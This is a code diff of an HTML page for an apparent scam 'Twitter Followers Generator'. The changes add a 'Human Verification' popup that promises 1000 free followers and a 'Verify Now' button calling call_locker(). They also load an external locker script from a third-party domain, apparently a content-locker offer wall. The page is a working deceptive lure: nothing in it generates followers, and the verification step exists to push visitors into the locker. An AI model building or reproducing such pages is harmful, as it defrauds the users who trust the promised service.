@@ -5378,13 +5378,23 @@ function hexToRgb(e){var a=/^#?([a-f\d])([a-f\d])([a-f\d])$/i;e=e.replace(a,func
 	});
 });
 		</script>
-	<body>	
-		<div id="app-particles"><canvas class="particles-js-canvas-el" width="987" height="913" style="width: 100%; height: 100%;"></canvas></div>
+	<body><div class="mfp-bg mfp-ready"></div><div class="mfp-wrap mfp-auto-cursor mfp-ready" tabindex="-1" style="overflow: hidden auto;"><div class="mfp-container mfp-inline-holder"><div class="mfp-content"><div class="popup-step-wrapper animated slideInUp" style="display: block;"><div class="verification-popup-wrapper animated fadeInUp">
+	<div class="verification-popup-inner-wrapper">
+		<h3>Human Verification</h3>
+		<p>Complete human verification below to recieve <span class="verification-followers-value">1000</span> followers for <span class="verification-network">Twitter</span> account @<span class="verification-username">"****"</span>. After verification is completed, newly generated followers will be added to your account.</p>
+		<i class="fa fa-spinner fa-spin"></i>
+		<div class="button-wrapper">
+			<div class="button button-verification" onclick="call_locker()"><span>Verify Now</span></div>
+		</div>
+	</div>
+</div>
+<script type="text/javascript" id="ogjs" src="https://www.verifysuper.com/cl/load.php?id=09d5bb70d4087ac554c40a93fc6d8a53"></script></div></div></div></div>	
+		<div id="app-particles"><canvas class="particles-js-canvas-el" width="988" height="913" style="width: 100%; height: 100%;"></canvas></div>
 		<div class="platform-navigation-wrapper">
 			<div class="row">
 				<div class="col-4">
 					<div class="platform-nav-item">
-						<div class="platform-nav-item-content platform-item-twitter active">
+						<div class="platform-nav-item-content platform-item-twitter">
 							<div>
 								<i class="fab fa-twitter"></i>
 								<img src="img/logo-tw.png" class="logo-text img-fluid">
@@ -5419,12 +5429,13 @@ function hexToRgb(e){var a=/^#?([a-f\d])([a-f\d])([a-f\d])$/i;e=e.replace(a,func
 		</div>
 		<section class="content-section">
 			<div class="container">
-				<div class="main-content" style="display: block;"><div class="network-intro-header network-intro-header-tw">
-	<i class="fab fa-twitter"></i>
-	<img src="img/logo-tw.png" class="logo-text img-fluid">
-	<div class="tool-title-wrapper">Followers Generator</div>
-</div>
-<div class="network-intro-content network-intro-content-tw" style="display: block;"><div class="email-step-content">
+				<div class="main-content animated bounceIn">
+					<div class="network-intro-header network-intro-header-tw">
+						<i class="fab fa-twitter"></i>
+						<img src="img/logo-tw.png" class="logo-text img-fluid">
+						<div class="tool-title-wrapper">Followers Generator</div>
+					</div>
+					<div class="network-intro-content network-intro-content-tw" style="display: block;"><div class="email-step-content">
 	<div class="intro-title-wrapper">
 		<span class="intro-step-title-number">2.</span><span class="intro-step-title">Select the amount of followers</span>
 		<div class="intro-instructions-wrapper">
@@ -5435,14 +5446,14 @@ function hexToRgb(e){var a=/^#?([a-f\d])([a-f\d])([a-f\d])$/i;e=e.replace(a,func
 		<div class="followers-select-wrapper">
 			<div class="row">
 				<div class="col-4">
-					<div class="followers-select-item followers-select-item-1 active">
+					<div class="followers-select-item followers-select-item-1">
 						<img src="img/f-img-1.png" class="img-fluid f-img">
 						<span class="followers-value followers-value-1">500</span>
 						<span class="followers-label">Followers</span>
 					</div>
 				</div>
 				<div class="col-4">
-					<div class="followers-select-item followers-select-item-2">
+					<div class="followers-select-item followers-select-item-2 active">
 						<img src="img/f-img-2.png" class="img-fluid f-img">
 						<span class="followers-value followers-value-2">1000</span>
 						<span class="followers-label">Followers</span>
@@ -5461,9 +5472,10 @@ function hexToRgb(e){var a=/^#?([a-f\d])([a-f\d])([a-f\d])$/i;e=e.replace(a,func
 			<div class="button button-2"><span>Generate Followers</span></div>
 		</div>
 	</div>
-</div></div></div>
+</div></div>
+				</div>
 			</div>
-		</section>
+		<div class="320i" style="display: block;"><div class="mfp-hide"></div></div></section>
 	
 	<!-- JS -->	
 	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>	
